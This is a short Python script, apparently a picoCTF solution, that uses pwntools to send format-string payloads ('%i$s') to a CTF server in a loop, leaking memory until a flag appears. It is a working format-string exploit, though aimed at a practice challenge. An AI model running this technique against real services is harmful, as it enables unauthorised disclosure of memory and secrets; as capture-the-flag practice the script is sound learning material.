#! /usr/bin/env python

from pwn import *

for i in range(99):    
    try:
        # nc saturn.picoctf.net 54158
        p = remote(host='saturn.picoctf.net',  port=50068)
        payload = f'%{i}$s'.encode()
        success(payload)
        p.sendlineafter(b"Tell me a story and then I'll tell you one >>", payload)
        leak_str = p.recvall()
        # get real flag
        if b'CTF{' in leak_str:
            success(leak_str)
            break;
        else:
            log.info(leak_str)
    except:
        pass
